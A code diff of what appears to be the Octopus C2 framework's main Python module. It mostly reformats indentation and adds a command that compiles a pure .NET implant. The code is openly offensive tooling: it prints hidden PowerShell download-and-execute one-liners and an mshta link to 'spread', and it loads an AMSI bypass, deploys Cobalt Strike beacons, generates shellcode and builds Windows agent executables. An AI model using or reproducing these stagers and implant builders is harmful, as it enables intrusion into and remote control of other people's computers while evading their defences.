@@ -15,14 +15,12 @@ import os
 import socket
 from socket import SO_REUSEADDR, SOL_SOCKET
 
-
 requests = []
 counter = 1
 listener_id = 0
 connections_information = {}
 listeners_information = {}
 commands = {}
-
 
 key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
 iv = "".join([random.choice(string.ascii_uppercase) for i in range(AES.block_size)])
@@ -35,37 +33,36 @@ oct_commands = [
     "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe",
     "generate_hta", "generate_macro", "generate_digispark", "delete_listener",
     "generate_spoofed_args_exe", "generate_x86_shellcode",
-    "generate_x64_shellcode"
-    ]
-
+    "generate_x64_shellcode", "generate_dotnet"
+]
 
 oct_commands_interact = [
     "load", "help", "exit", "back", "clear",
     "download", "load", "report", "disable_amsi", "modules",
     "deploy_cobalt_beacon"
-    ]
+]
 
 
 def check_url(url):
     if len(listeners_information) > 0:
         for listener in listeners_information:
             if url == listeners_information[listener][5]:
-                    return False
+                return False
             else:
-                   return True
+                return True
     else:
-	    return True
+        return True
 
 
 def check_listener_name(listener_name):
-	if len(listeners_information) > 0:
-	    for listener in listeners_information:
-		    if listener_name == listeners_information[listener][0]:
-			    return False
-		    else:
-			    return True
-	else:
-		return True
+    if len(listeners_information) > 0:
+        for listener in listeners_information:
+            if listener_name == listeners_information[listener][0]:
+                return False
+            else:
+                return True
+    else:
+        return True
 
 
 def check_listener_port(host, port):
@@ -83,10 +80,11 @@ def check_listener_port(host, port):
 
 
 def list_sessions():
-	    data = []
-	    for key in connections_information:
-               data.append(connections_information[key])
-	    print(("\n\n" + tabulate(data, ["Session", "IP", "Hostname", "Process Name / PID / Arch", "Username", "Domain", "Last ping", "OS"], "simple") + "\n\n"))
+    data = []
+    for key in connections_information:
+        data.append(connections_information[key])
+    print(("\n\n" + tabulate(data, ["Session", "IP", "Hostname", "Process Name / PID / Arch", "Username", "Domain",
+                                    "Last ping", "OS"], "simple") + "\n\n"))
 
 
 def get_history():
@@ -95,11 +93,11 @@ def get_history():
 
 
 def list_listeners():
-	    data = []
-	    for key in listeners_information:
-	        data.append(listeners_information[key])
-            # listener_name, ip, port, host, interval, path, listener_name
-	    print(("\n\n" + tabulate(data, ["Name", "IP", "Port", "Host", "Interval", "Path", "SSL"], "simple") + "\n\n"))
+    data = []
+    for key in listeners_information:
+        data.append(listeners_information[key])
+    # listener_name, ip, port, host, interval, path, listener_name
+    print(("\n\n" + tabulate(data, ["Name", "IP", "Port", "Host", "Interval", "Path", "SSL"], "simple") + "\n\n"))
 
 
 def completer(text, state):
@@ -129,17 +127,17 @@ def delete(hostname, sid):
     time.sleep(5)
     commands.pop(hostname)
     connections_information.pop(sid)
-    print(("[+] Session %s killed !"%hostname))
+    print(("[+] Session %s killed !" % hostname))
 
 
 def list_modules():
-	if os.path.isdir("modules"):
-		modules = os.listdir("modules")
-		for module in modules:
-			oct_commands_interact.append(module)
-			print(module)
-	else:
-		print((colored("[-] modules directory not Available")))
+    if os.path.isdir("modules"):
+        modules = os.listdir("modules")
+        for module in modules:
+            oct_commands_interact.append(module)
+            print(module)
+    else:
+        print((colored("[-] modules directory not Available")))
 
 
 def log_command(hostname, command, results):
@@ -150,33 +148,33 @@ def log_command(hostname, command, results):
     log_name = hostname + ".log"
     f = open("logs/%s" % log_name, "a")
     data = "Hostname : %s\n" % hostname
-    data+= "Command : %s\n" % command
-    data+= "Time : %s\n" % time.ctime()
-    data+= "Results : %s\n" % results
-    data+= str("+" * 30) + "\n"
+    data += "Command : %s\n" % command
+    data += "Time : %s\n" % time.ctime()
+    data += "Results : %s\n" % results
+    data += str("+" * 30) + "\n"
     f.write(data)
     f.close()
 
 
 def load_module(session, module_name):
-	module = "modules/" + module_name
-	if os.path.isfile(module):
-		fi = open(module, "r")
-		module_content = fi.read()
-		# encrypt module before send it
-		base64_command = encrypt_command(aes_key, aes_iv, module_content)
-		commands[session] = base64_command
-		print((colored("[+] Module should be loaded !", "green")))
-	else:
-		print((colored("[-] Module is not exist !")))
+    module = "modules/" + module_name
+    if os.path.isfile(module):
+        fi = open(module, "r")
+        module_content = fi.read()
+        # encrypt module before send it
+        base64_command = encrypt_command(aes_key, aes_iv, module_content)
+        commands[session] = base64_command
+        print((colored("[+] Module should be loaded !", "green")))
+    else:
+        print((colored("[-] Module is not exist !")))
 
 
 def load_beacon(session, beacon_path):
-	fi = open(beacon_path, "r")
-	module_content = fi.read()
-	# encrypt module before send it
-	base64_command = encrypt_command(aes_key, aes_iv, module_content)
-	commands[session] = base64_command
+    fi = open(beacon_path, "r")
+    module_content = fi.read()
+    # encrypt module before send it
+    base64_command = encrypt_command(aes_key, aes_iv, module_content)
+    commands[session] = base64_command
 
 
 def deploy_cobalt_beacon(session, beacon_path):
@@ -196,33 +194,41 @@ def deploy_cobalt_beacon(session, beacon_path):
 
 
 def disable_amsi(session):
-	amsi_module = "modules/ILBypass.ps1"
-	if os.path.isfile(amsi_module):
-		fi = open(amsi_module, "r")
-		module_content = fi.read()
-		base64_command = encrypt_command(aes_key, aes_iv, module_content)
-		commands[session] = base64_command
-		print((colored("AMSI disable module has been loaded !", "green")))
+    amsi_module = "modules/ILBypass.ps1"
+    if os.path.isfile(amsi_module):
+        fi = open(amsi_module, "r")
+        module_content = fi.read()
+        base64_command = encrypt_command(aes_key, aes_iv, module_content)
+        commands[session] = base64_command
+        print((colored("AMSI disable module has been loaded !", "green")))
 
-	else:
-		print((colored("[-] AMSI Module is not exist !")))
+    else:
+        print((colored("[-] AMSI Module is not exist !")))
 
 
 def generate(hostname, path, proto, interval):
     c = random.choice(string.ascii_lowercase)
     print((colored("#====================", "red")))
-    print(("1) powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
-    print(("2) powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
-    print(("3) powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"\n'.format(hostname, path, proto, c)))
-    print("Note - For Windows 7 clients you may need to prefix the payload with " + '"Add-Type -AssemblyName System.Core;"')
-    print(("       e.g. powershell -w hidden " + '"Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
+    print(("1) powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(
+        hostname, path, proto)))
+    print((
+                      "2) powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(
+                  hostname, path, proto)))
+    print((
+                      "3) powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"\n'.format(
+                  hostname, path, proto, c)))
+    print(
+        "Note - For Windows 7 clients you may need to prefix the payload with " + '"Add-Type -AssemblyName System.Core;"')
+    print((
+                      "       e.g. powershell -w hidden " + '"Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(
+                  hostname, path, proto)))
     print("Hack your way in ;)")
     print((colored("#====================", "red")))
 
 
 def generate_hta(host_ip, port, proto):
     print((colored("#====================", "red")))
-    print(("mshta " + '{0}://{1}:{2}{3}'.format(proto, host_ip,port, mshta_url)))
+    print(("mshta " + '{0}://{1}:{2}{3}'.format(proto, host_ip, port, mshta_url)))
     print("spread it and wait ;)")
     print((colored("#====================", "red")))
 
@@ -311,7 +317,7 @@ def generate_x64_shellcode(hostname, path, proto_to_use):
             shellcode_length = shellcode.strip("\n").split("\\")
             print(colored("[+] Shellcode Size : %s Bytes" % len(shellcode_length[1:]), "green"))
             print(colored("[+] Shellcode generated sucessfully!\n", "green"))
-            print('unsigned char shellcode[] = "%s"; ' % shellcode.replace("\n", "") + "\n" )
+            print('unsigned char shellcode[] = "%s"; ' % shellcode.replace("\n", "") + "\n")
             os.system("rm -rf /tmp/tmpx64.obj")
             os.system("rm -rf /tmp/tmpx64.nasm")
 
@@ -341,7 +347,7 @@ def generate_x86_shellcode(hostname, path, proto_to_use):
             shellcode_length = shellcode.strip("\n").split("\\")
             print(colored("[+] Shellcode Size : %s Bytes" % len(shellcode_length[1:]), "green"))
             print(colored("[+] Shellcode generated sucessfully!\n", "green"))
-            print('unsigned char shellcode[] = "%s"; ' % shellcode.replace("\n", "") + "\n" )
+            print('unsigned char shellcode[] = "%s"; ' % shellcode.replace("\n", "") + "\n")
             os.system("rm -rf /tmp/tmp.obj")
             os.system("rm -rf /tmp/tmp.nasm")
 
@@ -349,25 +355,44 @@ def generate_x86_shellcode(hostname, path, proto_to_use):
         print(colored("[-] Unable to generate shellcode!", "red"))
 
 
-
 def generate_exe_powershell_downloader(hostname, path, proto, output_path):
-	if os.system("which mono-csc") == 0:
-		url = "{2}://{0}/{1}".format(hostname, path, proto)
-		ft = open("agents/octopus.cs")
-		template = ft.read()
-		code = template.replace("OCT_URL", url)
-		f = open("tmp.cs", "w")
-		f.write(code)
-		f.close()
-		compile_command = "mono-csc /target:winexe /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
-		if os.system(compile_command) == 0:
-			print((colored("[+] file compiled successfully !", "green")))
-			print((colored("[+] binary file saved to {0}".format(output_path), "red")))
-			os.system("rm tmp.cs")
-		else:
-			print("[-] error while compiling !")
-	else:
-		print("[-] mono-csc is not installed !")
+    if os.system("which mono-csc") == 0:
+        url = "{2}://{0}/{1}".format(hostname, path, proto)
+        ft = open("agents/octopus.cs")
+        template = ft.read()
+        code = template.replace("OCT_URL", url)
+        f = open("tmp.cs", "w")
+        f.write(code)
+        f.close()
+        compile_command = "mono-csc /target:winexe /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
+        if os.system(compile_command) == 0:
+            print((colored("[+] file compiled successfully !", "green")))
+            print((colored("[+] binary file saved to {0}".format(output_path), "red")))
+            os.system("rm tmp.cs")
+        else:
+            print("[-] error while compiling !")
+    else:
+        print("[-] mono-csc is not installed !")
+
+
+def generate_exe(hostname, proto, task_check_interval, output_path):
+    if os.system("which mono-csc") == 0:
+        ft = open("agents/OctopusDotNET/Config.template")
+        template = ft.read()
+        template = replace_agent_config_vars(template, proto, hostname, task_check_interval)
+        f = open("agents/OctopusDotNET/Config.oct", "w")
+        f.write(template)
+        f.close()
+
+        compile_command = "mono-csc /r:includes/System.Management.Automation.dll /pkg:dotnet /target:winexe /recurse:agents/OctopusDotNET/*.oct /out:%s" % output_path
+
+        if os.system(compile_command) == 0:
+            print((colored("[+] file compiled successfully !", "green")))
+            print((colored("[+] binary file saved to {0}".format(output_path), "red")))
+        else:
+            print("[-] error while compiling !")
+    else:
+        print("[-] mono-csc is not installed !")
 
 
 def main_help_banner():
@@ -381,6 +406,7 @@ def main_help_banner():
     print("* generate_powershell \t\t\tgenerate powershell oneliner")
     print("* generate_hta \t\t\t\tgenerate HTA Link")
     print("* generate_unmanaged_exe \t\tgenerate unmanaged executable agent")
+    print("* generate_dotnet \t\tgenerate unmanaged executable agent [Pure .NET agent]")
     print("* generate_spoofed_args_exe \t\tgenerate executable that fake the powerhell oneliner args")
     print("* generate_digispark \t\t\tgenerate digispark file (HID Attack)")
     print("* generate_x86_shellcode \t\tgenerate 32-bit shellcode the run Octopus agent via CreateProcessA")
@@ -421,19 +447,19 @@ def https_help_banner():
 
 
 def interact_help():
-	print("\n")
-	print("Available commands to use :\n")
-	print("Hint : if you want to execute system command just type it and wait for the results\n")
-	print("+++++++++")
-	print("help  \t\t\t\tshow this help menu")
-	print("exit/back \t\t\texit current session and back to the main screen")
-	print("clear \t\t\t\tclear the screen output")
-	print("download \t\t\tdownload file from the target machine")
-	print("deploy_cobalt_beacon \t\tdeploy cobalt strike powershell beacon in the current process")
-	print("load \t\t\t\tload powershell module to the target machine")
-	print("disable_amsi \t\t\tdisable AMSI on the target machine")
-	print("report \t\t\t\tget situation report from the target")
-	print("\n")
+    print("\n")
+    print("Available commands to use :\n")
+    print("Hint : if you want to execute system command just type it and wait for the results\n")
+    print("+++++++++")
+    print("help  \t\t\t\tshow this help menu")
+    print("exit/back \t\t\texit current session and back to the main screen")
+    print("clear \t\t\t\tclear the screen output")
+    print("download \t\t\tdownload file from the target machine")
+    print("deploy_cobalt_beacon \t\tdeploy cobalt strike powershell beacon in the current process")
+    print("load \t\t\t\tload powershell module to the target machine")
+    print("disable_amsi \t\t\tdisable AMSI on the target machine")
+    print("report \t\t\t\tget situation report from the target")
+    print("\n")
 
 
 def replace_agent_config_vars(template_str, server_http_protocol, server_hostname, task_check_interval):
@@ -453,14 +479,14 @@ def replace_agent_config_vars(template_str, server_http_protocol, server_hostnam
 
 
 def banner():
-	# \033[94m
+    # \033[94m
     version = '\33[43m V1.0 Beta \033[0m'
     Yellow = '\33[33m'
     OKGREEN = '\033[92m'
     CRED = '\033[91m'
     ENDC = '\033[0m'
 
-    banner =  r'''
+    banner = r'''
 
 {0}
       ___           ___                       ___           ___         ___           ___
@@ -482,6 +508,5 @@ def banner():
 {2} Octopus C2 | Control your shells {1}
 
 '''
-
 
     print((banner.format(CRED, ENDC, OKGREEN, Yellow)))
